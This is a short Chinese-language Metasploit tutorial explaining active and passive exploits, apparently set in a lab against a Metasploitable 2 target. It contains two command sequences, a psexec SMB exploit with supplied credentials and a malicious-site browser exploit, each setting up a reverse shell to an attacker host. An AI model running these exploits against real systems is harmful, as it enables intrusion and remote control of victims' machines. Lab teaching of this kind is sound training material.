1、简介

Metasploit框架中的所有漏洞都将分为两类：主动和被动。

2、主动漏洞利用

2.1 主动漏洞利用特点

    • ✅主动漏洞利用将利用特定主机，运行直至完成，然后退出。

    • ✅当从受害者打开shell时，暴力模块将退出。

    • ✅如果遇到错误，模块执行将停止。

    • ✅您可以通过向exploit命令传递“ -j”来强制活动模块进入后台

2.2 主动漏洞利用示例

漏洞靶机使用Metasploitable 2进行演示，Kali攻击机IP为：192.168.207.134 ，靶机IP地址为：192.168.207.136

use exploit/windows/smb/psexecset RHOST 192.168.207.136set PAYLOAD windows/shell/reverse_tcpset LHOST 192.168.207.134set LPORT 4444set SMBUSER victimset SMBPASS s3cr3texploit

3、被动漏洞利用

被动漏洞利用会等待传入的主机并在它们连接时加以利用。

    • ✅被动漏洞利用几乎总是集中在Web浏览器，FTP客户端等客户端上。

    • ✅它们也可以与电子邮件攻击结合使用，以等待连接。

    • ✅可以通过将“ -l”传递给sessions命令来枚举被动攻击报告shell发生的情况。传递“ -i”将与外壳交互。

3.1 被动漏洞利用示例

以下输出显示了利用动画光标漏洞的设置。除非受害者浏览到我们的恶意网站，否则该攻击不会触发。

use exploit/windows/browser/ani_loadimage_chunksizeset URIPATH /set PAYLOAD windows/shell/reverse_tcpset LHOST 192.168.1.5set LPORT 4444exploit
